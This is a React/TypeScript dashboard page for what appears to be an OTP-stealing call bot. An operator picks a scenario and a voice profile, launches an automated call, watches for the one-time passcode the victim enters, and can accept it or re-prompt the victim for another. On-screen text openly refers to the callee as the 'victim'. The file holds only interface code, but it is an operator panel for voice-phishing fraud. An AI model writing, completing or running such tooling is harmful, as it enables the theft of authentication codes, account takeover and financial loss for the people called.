
import React, { useState, useEffect, useCallback } from 'react';
import PageWrapper from '../components/layout/PageWrapper';
import CallTriggerForm from '../components/calls/CallTriggerForm';
import LiveOtpInteraction from '../components/calls/LiveOtpInteraction';
import Card from '../components/common/Card';
import Button from '../components/common/Button'; // Added Button import
import { HomeIcon, InformationCircleIcon, CheckCircleIcon, ExclamationTriangleIcon, CallIcon } from '../components/common/Icons';
import { VoiceProfile, CallParams, ScenarioType, InitiateCallPayload, ActiveCallSession, CapturedOtpDetails, LiveCallUiState } from '../types';
import { fetchVoiceProfiles } from '../services/voiceProfileService';
import { initiateCall, submitOtpDecision, pollForOtpUpdates } from '../services/callService';
import { AVAILABLE_SCENARIOS } from '../constants';


const DashboardPage: React.FC = () => {
  const [voiceProfiles, setVoiceProfiles] = useState<VoiceProfile[]>([]);
  const [isLoadingProfiles, setIsLoadingProfiles] = useState<boolean>(true);
  const [activeCallSession, setActiveCallSession] = useState<ActiveCallSession | null>(null);
  
  // For polling: Store the cleanup function for the poller
  const [stopPolling, setStopPolling] = useState<(() => void) | null>(null);


  useEffect(() => {
    const loadProfiles = async () => {
      try {
        setIsLoadingProfiles(true);
        const profiles = await fetchVoiceProfiles();
        setVoiceProfiles(profiles);
      } catch (error) {
        console.error("Failed to load voice profiles", error);
        // Update UI to show error for profiles
        setActiveCallSession({
            callId: 'profile_load_error',
            scenarioType: ScenarioType.GENERIC_OTP, // Placeholder
            uiState: 'FAILED',
            statusMessage: 'Failed to load voice profiles necessary for making calls.',
        });
      } finally {
        setIsLoadingProfiles(false);
      }
    };
    loadProfiles();
  }, []);

  // Effect to handle polling for OTP updates when a call is in OTP_PENDING_USER_VALIDATION state
  useEffect(() => {
    if (activeCallSession?.uiState === 'OTP_PENDING_USER_VALIDATION' && activeCallSession.callId && !activeCallSession.capturedOtp) {
      // Start polling if not already started
      if (stopPolling === null) {
        const pollerStopper = pollForOtpUpdates(activeCallSession.callId, (otpDetails) => {
          // This callback is invoked by the poller when new OTP details are available
          setActiveCallSession(prev => {
            if (prev && prev.callId === activeCallSession.callId && prev.uiState === 'OTP_PENDING_USER_VALIDATION') {
              return { ...prev, capturedOtp: otpDetails, statusMessage: otpDetails.message || 'OTP Captured. Awaiting your validation.' };
            }
            return prev;
          });
        });
        setStopPolling(() => pollerStopper); // Store the cleanup function
      }
    } else if (stopPolling !== null && activeCallSession?.uiState !== 'OTP_PENDING_USER_VALIDATION' && activeCallSession?.uiState !== 'REPROMPTING_VICTIM') {
      // Stop polling if call is no longer in a state that requires OTP polling
      stopPolling();
      setStopPolling(null);
    }
    
    // Cleanup poller when component unmounts or activeCallSession changes significantly
    return () => {
      if (stopPolling) {
        stopPolling();
      }
    };
  }, [activeCallSession, stopPolling]);


  const handleInitiateCall = async (params: CallParams, selectedScenarioType: ScenarioType, selectedVoiceProfileId: string) => {
    setActiveCallSession({
        callId: '', 
        scenarioType: selectedScenarioType, 
        uiState: 'INITIATING', 
        statusMessage: 'Initiating call...' 
    });
    try {
      const payload: InitiateCallPayload = {
        ...params,
        scenarioType: selectedScenarioType,
        selectedVoiceId: selectedVoiceProfileId,
      };
      const response = await initiateCall(payload);
      if (response.success && response.callId) {
        setActiveCallSession({
          callId: response.callId,
          scenarioType: selectedScenarioType,
          uiState: response.initialUiState || 'FAILED', // Use suggested state or default to FAILED
          statusMessage: response.message,
          capturedOtp: null, // Initially no OTP
        });
      } else {
        setActiveCallSession({
            callId: '', 
            scenarioType: selectedScenarioType, 
            uiState: 'FAILED', 
            statusMessage: response.message 
        });
      }
    } catch (error) {
      console.error("Error initiating call:", error);
      setActiveCallSession({ 
          callId: '',
          scenarioType: selectedScenarioType,
          uiState: 'FAILED', 
          statusMessage: 'An unexpected error occurred while initiating the call.' 
      });
    }
  };
  
  const handleOtpDecision = async (callId: string, decision: 'accept' | 'deny', otpValue: string) => {
    if (!activeCallSession) return;

    // Set UI state to indicate submission is in progress
    // capturedOtp is intentionally kept from `prev` state as it's the OTP being submitted.
    setActiveCallSession(prev => prev ? { 
        ...prev, 
        uiState: 'SUBMITTING_OTP_DECISION', 
        statusMessage: `Submitting ${decision} for OTP ${otpValue}...`, 
        lastAttemptedOtp: otpValue 
    } : null);

    try {
      const response = await submitOtpDecision(callId, decision, otpValue);
      setActiveCallSession(prev => {
        if (!prev || prev.callId !== callId) return prev; // Stale update or call has changed
        return {
          ...prev,
          uiState: response.nextUiState,
          statusMessage: response.message,
          capturedOtp: response.nextUiState === 'OTP_PENDING_USER_VALIDATION' ? (response.newOtpDetails || null) : null,
        };
      });
    } catch (error) {
      console.error(`Error submitting OTP ${decision}:`, error);
       setActiveCallSession(prev => prev ? { ...prev, uiState: 'FAILED', statusMessage: `Failed to submit OTP ${decision}.` } : null);
    }
  };

  const resetCallFlow = () => {
    if (stopPolling) {
        stopPolling();
        setStopPolling(null);
    }
    setActiveCallSession(null);
  }

  const showCallTriggerForm = !activeCallSession || activeCallSession.uiState === 'COMPLETED' || activeCallSession.uiState === 'FAILED';

  return (
    <PageWrapper title="Dashboard & Call Orchestration" icon={<HomeIcon className="w-8 h-8"/>}>
      <div className="grid grid-cols-1 lg:grid-cols-3 gap-6">
        <div className="lg:col-span-2">
          {showCallTriggerForm ? (
            <CallTriggerForm
              scenarios={AVAILABLE_SCENARIOS}
              voiceProfiles={voiceProfiles}
              isLoadingProfiles={isLoadingProfiles}
              isSubmittingCall={activeCallSession?.uiState === 'INITIATING'}
              onSubmit={handleInitiateCall}
            />
          ) : null}

          {activeCallSession && activeCallSession.uiState !== 'IDLE' && (
            <Card title="Active Call Status" icon={<CallIcon className="w-6 h-6"/>} className="mt-6">
              <p className="text-sm mb-2">
                <span className="font-semibold">Call ID:</span> {activeCallSession.callId || "N/A"} <br />
                <span className="font-semibold">Scenario:</span> {AVAILABLE_SCENARIOS.find(s => s.type === activeCallSession.scenarioType)?.displayName || activeCallSession.scenarioType} <br />
                <span className="font-semibold">Status:</span> {activeCallSession.statusMessage}
              </p>

              {activeCallSession.uiState === 'INITIATING' && (
                <div className="flex items-center justify-center p-4">
                  <svg className="animate-spin h-8 w-8 text-primary-600" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24">
                    <circle className="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" strokeWidth="4"></circle>
                    <path className="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path>
                  </svg>
                  <p className="ml-3 text-secondary-700">Connecting call...</p>
                </div>
              )}
              
              {/* Show LiveOtpInteraction if OTP is pending OR if a decision is currently being submitted */}
              {(activeCallSession.uiState === 'OTP_PENDING_USER_VALIDATION' || activeCallSession.uiState === 'SUBMITTING_OTP_DECISION') && 
                activeCallSession.capturedOtp && activeCallSession.callId && (
                <LiveOtpInteraction
                  otpDetails={activeCallSession.capturedOtp}
                  callId={activeCallSession.callId}
                  isProcessingDecision={activeCallSession.uiState === 'SUBMITTING_OTP_DECISION'}
                  onAccept={(callId, otpValue) => handleOtpDecision(callId, 'accept', otpValue)}
                  onDeny={(callId, otpValue) => handleOtpDecision(callId, 'deny', otpValue)}
                  lastAttemptedOtp={activeCallSession.lastAttemptedOtp}
                />
              )}

              {/* Show "Waiting for victim" only if specifically in OTP_PENDING and no OTP yet (or LiveOtpInteraction isn't shown) */}
              {activeCallSession.uiState === 'OTP_PENDING_USER_VALIDATION' && !activeCallSession.capturedOtp && (
                 <div className="flex items-center justify-center p-4">
                    <svg className="animate-pulse h-5 w-5 text-primary-500 mr-2" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 20 20" fill="currentColor">
                        <path d="M2 10a8 8 0 1116 0 8 8 0 01-16 0zm2 0a6 6 0 1012 0 6 6 0 00-12 0zm9-3a1 1 0 00-2 0v2.586l-1.707 1.707a1 1 0 001.414 1.414L10 11.414V7a1 1 0 00-1-1z" />
                    </svg>
                   <p className="text-sm text-secondary-600">Waiting for victim to enter OTP...</p>
                 </div>
              )}

              {activeCallSession.uiState === 'REPROMPTING_VICTIM' && (
                 <div className="flex items-center justify-center p-4 text-orange-600">
                   <InformationCircleIcon className="w-5 h-5 mr-2"/>
                   <p className="text-sm">Re-prompting victim for new OTP. Waiting for input...</p>
                 </div>
              )}

            {(activeCallSession.uiState === 'COMPLETED' || activeCallSession.uiState === 'FAILED') && (
                 <Button onClick={resetCallFlow} variant="secondary" className="mt-4 w-full">
                    Start New Call
                </Button>
            )}
            </Card>
          )}


          {activeCallSession?.uiState === 'FAILED' && (
            <div className={`mt-4 p-4 rounded-md text-sm flex items-center bg-red-100 text-red-700`}>
              <ExclamationTriangleIcon className="w-5 h-5 mr-2"/>
              {activeCallSession.statusMessage}
            </div>
          )}
           {activeCallSession?.uiState === 'COMPLETED' && (
            <div className={`mt-4 p-4 rounded-md text-sm flex items-center bg-green-100 text-green-700`}>
              <CheckCircleIcon className="w-5 h-5 mr-2"/>
              {activeCallSession.statusMessage}
            </div>
          )}

        </div>
        
        <div className="lg:col-span-1 space-y-6">
           <Card title="Quick Guide" icon={<InformationCircleIcon className="w-6 h-6"/>}>
            <ul className="list-disc list-inside space-y-1 text-sm text-secondary-600">
              <li>Select a <strong className="text-primary-600">Call Scenario</strong>.</li>
              <li>Fill in required parameters.</li>
              <li>Choose a <strong className="text-primary-600">Voice Profile</strong>.</li>
              <li>Click "Initiate Call".</li>
              <li>If the scenario expects OTP validation, the captured OTP will appear here for you to "Accept" or "Deny".</li>
            </ul>
            <p className="mt-3 text-xs text-secondary-500">
              Ensure backend is configured and running. This UI simulates real-time interactions.
            </p>
          </Card>

          <Card title="Recent Activity (Mock)" icon={<InformationCircleIcon className="w-6 h-6"/>}>
            <ul className="space-y-2 text-sm text-secondary-600">
              <li>Call to +15551234567 (OTP Scenario) - Success</li>
              <li>Call to +15557890123 (PGP Scenario) - Failed</li>
              <li>Settings updated: Ngrok URL changed.</li>
            </ul>
          </Card>
        </div>
      </div>
    </PageWrapper>
  );
};

export default DashboardPage;
